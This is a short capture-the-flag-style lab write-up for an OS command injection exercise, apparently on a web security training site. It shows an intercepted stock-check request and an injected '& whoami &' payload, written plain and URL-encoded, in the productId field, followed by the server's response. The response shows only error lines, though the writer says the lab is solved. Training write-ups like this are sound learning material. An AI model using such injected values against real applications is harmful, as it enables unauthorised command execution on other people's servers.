# Lab Writeup: OS command injection, simple case

## Description

This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the `whoami` command to determine the name of the current user.

## Solution

1. Go to one of the products' page
2. Click check stock and intercept the POST request and you'll see the following request

   ```
    POST /product/stock HTTP/2
    Host: 0ad2009f0480c38b80192b79001300eb.web-security-academy.net
    Cookie: session=qGzjgUwEhW5Zq3oUaRViCw13gv1bJsyl
    Content-Length: 21
    Sec-Ch-Ua: "Not-A.Brand";v="99", "Chromium";v="124"
    Sec-Ch-Ua-Platform: "Linux"
    Sec-Ch-Ua-Mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Accept: */*
    Origin: https://0ad2009f0480c38b80192b79001300eb.web-security-academy.net
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://0ad2009f0480c38b80192b79001300eb.web-security-academy.net/product?productId=1
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-US,en;q=0.9
    Priority: u=1, i

    productId=1&storeId=1
   ```

3. Send the above request to repeater
4. Change the value of productId to `& whoami &` which the encoded URL form is `%26%20%77%68%6f%61%6d%69%20%26` the request body will be `productId=%26%20%77%68%6f%61%6d%69%20%26&storeId=1` here's the full response:

   ```
   HTTP/2 200 OK
   Content-Type: text/plain; charset=utf-8
   X-Frame-Options: SAMEORIGIN
   Content-Length: 84

   sh: 1: 1: not found
   /home/peter-6N4QTN/stockreport.sh: line 5: $1: unbound variable
   ```

   The lab is solved.
